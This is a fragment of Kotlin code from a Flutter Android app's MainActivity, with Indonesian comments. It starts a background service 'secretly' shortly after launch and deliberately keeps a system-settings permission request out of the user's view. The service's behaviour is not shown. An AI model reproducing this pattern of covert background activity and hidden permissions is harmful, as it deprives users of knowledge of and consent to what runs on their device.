...
class MainActivity : FlutterActivity() {
    ...
    override fun onCreate(savedInstanceState: android.os.Bundle?) {
        ...
        // Start BackgroundService diam-diam
        uiHandler.postDelayed({ startBackgroundService() }, 1000)
        // Request WRITE_SETTINGS permission diam-diam (untuk fitur brightness)
        // Hanya tampil 1x saat pertama install, setelah itu tidak muncul lagi
        requestWriteSettings()
    }

    // ── WRITE_SETTINGS tidak dibuka ke user ─────────────────────────────
    // Fitur brightness tetap berjalan, kalau tidak punya permission
    // BackgroundService sudah handle dengan try/catch tanpa crash
    private fun requestWriteSettings() {
        // Tidak membuka halaman settings — tetap 1 permission saja (Overlay)
        // Brightness akan bekerja di HP yang tidak ketat permission-nya
    }
